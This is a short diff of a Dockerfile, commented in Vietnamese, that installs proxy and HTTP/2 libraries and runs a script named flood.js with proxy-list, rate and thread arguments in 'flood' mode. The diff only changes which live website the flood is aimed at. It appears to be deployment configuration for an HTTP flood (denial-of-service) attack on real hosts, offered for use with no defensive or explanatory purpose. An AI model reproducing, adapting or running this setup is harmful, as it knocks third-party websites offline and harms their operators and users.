@@ -20,4 +20,4 @@ RUN npm install hpack https commander colors socks set-cookie-parser
 RUN node -v && npm -v
 
 # Chạy script khi container khởi động và giữ container chạy
-RUN node flood.js https://graph.vshield.pro/ 120 10 10 live.txt flood && tail -f /dev/null
+RUN node flood.js https://countbot.lol/7371969470-e4644541-a352-48dd-97be-185e93e08c08 120 10 10 live.txt flood && tail -f /dev/null
